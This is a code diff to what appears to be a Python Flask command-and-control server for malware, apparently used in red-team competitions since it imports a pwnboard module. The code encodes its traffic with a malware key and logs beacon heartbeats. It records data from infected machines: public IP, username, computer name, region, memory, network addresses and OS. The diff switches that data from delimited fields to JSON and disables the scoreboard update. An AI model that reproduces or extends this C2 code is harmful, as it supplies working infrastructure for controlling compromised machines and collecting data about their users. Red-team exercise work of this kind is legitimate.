@@ -14,8 +14,7 @@ from c2.pwnboard import send_update
 import time
 import datetime
 import uuid
-
-
+import json
 
 
 def mal_encode(key, clear):
@@ -100,11 +99,11 @@ def heartbeat():
             """
                 This part below updates pwnboard to reflect the beacon
             """
-            nwaddrstring = ",".join(dbmain.bot_nwaddrtostring(conn, id))
-            if nwaddrstring != None and nwaddrstring != "" and "," in nwaddrstring and nwaddrstring != "No network address data":
-                ips = re.findall(r"10.\d{1,3}\.\d{1,3}\.\d{1,3}", nwaddrstring)
-                if len(ips) > 0:
-                    send_update(ips[0])
+            # nwaddrstring = ",".join(dbmain.bot_nwaddrtostring(conn, id))
+            # if nwaddrstring != None and nwaddrstring != "" and "," in nwaddrstring and nwaddrstring != "No network address data":
+            #     ips = re.findall(r"10.\d{1,3}\.\d{1,3}\.\d{1,3}", nwaddrstring)
+            #     if len(ips) > 0:
+            #         send_update(ips[0])
         return mal_encode(app.malware_key, "1")
 
 
@@ -125,15 +124,15 @@ def info():
             d = mal_decode(app.malware_key, request.data)
             conn = get_db()
 
-            spltdata = d.split('&')
-            print(spltdata)
-            dbmain.update_ip(conn, id, spltdata[0])
-            dbmain.update_username(conn, id, spltdata[1])
-            dbmain.update_devicename(conn, id, spltdata[2])
-            dbmain.update_region(conn, id, spltdata[3])
-            dbmain.update_memory(conn, id, spltdata[4])
-            dbmain.update_networkaddresses(conn, id, spltdata[5])
-            dbmain.update_os(conn, id, spltdata[6])
+            jdata = json.loads(d)
+            print(jdata)
+            dbmain.update_ip(conn, id, jdata["publicip"])
+            dbmain.update_username(conn, id, jdata["username"])
+            dbmain.update_devicename(conn, id, jdata["computername"])
+            dbmain.update_region(conn, id, jdata["region"])
+            dbmain.update_memory(conn, id, jdata["memory"])
+            dbmain.update_networkaddresses(conn, id, jdata["netinfo"])
+            dbmain.update_os(conn, id, jdata["osinfo"])
             return mal_encode(app.malware_key, "Success")
 
 @app.route(app.config['ENDPOINT_PS'], methods=['POST'])
